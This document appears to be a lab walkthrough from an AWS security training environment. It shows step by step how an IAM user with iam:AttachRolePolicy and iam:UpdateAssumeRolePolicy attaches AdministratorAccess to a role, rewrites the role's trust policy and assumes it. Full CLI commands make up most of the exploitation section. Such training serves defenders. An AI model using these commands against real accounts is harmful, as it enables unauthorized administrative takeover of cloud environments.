# Guided Walkthrough: Privilege Escalation via iam:AttachRolePolicy + iam:UpdateAssumeRolePolicy

This scenario demonstrates a sophisticated privilege escalation vulnerability that combines two powerful IAM permissions: `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy`. While each permission is dangerous on its own, their combination creates a complete privilege escalation path that allows an attacker to gain full administrative access through role manipulation.

The attack works by first attaching the AdministratorAccess managed policy to a target role using `iam:AttachRolePolicy`, effectively granting that role full administrative permissions. The attacker then uses `iam:UpdateAssumeRolePolicy` to modify the role's trust policy, adding their own user as a trusted principal. Once the trust policy is updated, the attacker can assume the now-privileged role to gain administrative access.

A critical aspect of this attack is that **the starting user does not need `sts:AssumeRole` permissions**. When a principal is explicitly named in a role's trust policy, AWS allows that principal to assume the role regardless of their own IAM permissions. This is a fundamental AWS behavior that many security teams overlook — trust policies grant permission from the role's side, making `sts:AssumeRole` permissions on the assuming principal unnecessary when they are specifically trusted.

This attack path is particularly dangerous because it combines infrastructure modification (attaching policies) with access control manipulation (updating trust relationships), allowing an attacker to both create and exploit administrative privileges. Organizations often fail to recognize the compound risk of granting both permissions together.

## The Challenge

You start as `pl-prod-iam-019-to-admin-starting-user`, an IAM user with two targeted permissions: `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy`, both scoped to `pl-prod-iam-019-to-admin-target-role`. You cannot list IAM users, you cannot assume roles, and you have no administrative access.

Your goal is to gain full administrative control over the AWS account by assuming `pl-prod-iam-019-to-admin-target-role` after transforming it into an admin role that trusts you.

Credentials for `pl-prod-iam-019-to-admin-starting-user` are available from Terraform outputs:

```bash
cd <project-root>
terraform output -json | jq '.single_account_privesc_one_hop_to_admin_iam_019_iam_attachrolepolicy_iam_updateassumerolepolicy.value'
```

## Reconnaissance

First, confirm your identity and verify that you don't yet have administrative access.

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-iam-019-to-admin-starting-user

aws iam list-users --max-items 1
# An error occurred (AccessDenied) -- good, no admin access yet
```

Next, check the target role's current state. You'll want to confirm that it doesn't yet have elevated permissions and that its trust policy does not already trust you.

```bash
# Who can currently assume the target role?
aws iam get-role \
  --role-name pl-prod-iam-019-to-admin-target-role \
  --query 'Role.AssumeRolePolicyDocument' \
  --output json

# What policies are attached to the target role?
aws iam list-attached-role-policies \
  --role-name pl-prod-iam-019-to-admin-target-role \
  --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
  --output table
# (No managed policies attached)
```

Notice that the trust policy does not include your user and no managed policies are attached — the role is currently harmless.

One more interesting thing to verify: your user policy does not include `sts:AssumeRole`. You will be able to assume the role anyway after you update the trust policy, because being explicitly named in a role's trust policy is sufficient — the assume permission is granted from the role's side.

```bash
aws iam get-user-policy \
  --user-name pl-prod-iam-019-to-admin-starting-user \
  --policy-name pl-prod-iam-019-to-admin-starting-user-policy \
  --query 'PolicyDocument' \
  --output json
# Confirm: no sts:AssumeRole in this policy
```

## Exploitation

With the lay of the land understood, it's time to execute the two-step escalation.

**Step 1 — Attach AdministratorAccess to the target role**

```bash
aws iam attach-role-policy \
  --role-name pl-prod-iam-019-to-admin-target-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

The target role now has full administrative permissions. But you still can't assume it — the trust policy doesn't trust you yet.

Wait 15 seconds for the IAM policy change to propagate, then continue.

**Step 2 — Update the trust policy to allow your user to assume the role**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)

aws iam update-assume-role-policy \
  --role-name pl-prod-iam-019-to-admin-target-role \
  --policy-document "{
    \"Version\": \"2012-10-17\",
    \"Statement\": [{
      \"Effect\": \"Allow\",
      \"Principal\": {
        \"AWS\": \"arn:aws:iam::${ACCOUNT_ID}:user/pl-prod-iam-019-to-admin-starting-user\"
      },
      \"Action\": \"sts:AssumeRole\"
    }]
  }"
```

Wait another 15 seconds for the trust policy change to propagate.

**Step 3 — Assume the now-privileged role**

```bash
CREDENTIALS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-iam-019-to-admin-target-role" \
  --role-session-name escalation-session \
  --query 'Credentials' \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
```

## Verification

With the role credentials active, verify that you now have administrative access.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:assumed-role/pl-prod-iam-019-to-admin-target-role/escalation-session

aws iam list-users --max-items 3 --output table
# Successfully lists IAM users -- admin access confirmed
```

## What Happened

You started with two carefully scoped permissions on a low-privilege IAM user. By using `iam:AttachRolePolicy` you gave a dormant role full administrative power. By using `iam:UpdateAssumeRolePolicy` you opened the door for yourself to walk through. Neither action required admin credentials — both were permitted by the starting user's inline policy. The final `sts:AssumeRole` call didn't require any explicit permission on your user at all, because the trust policy grant came from the role's side.

This technique is particularly common in environments where developers are granted broad IAM write permissions for automation purposes. The combination of the two permissions is effectively equivalent to a direct path to admin, yet it may not be flagged by tools that evaluate each permission in isolation. A CSPM tool needs to evaluate the compound risk of holding both `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` together to surface this path.
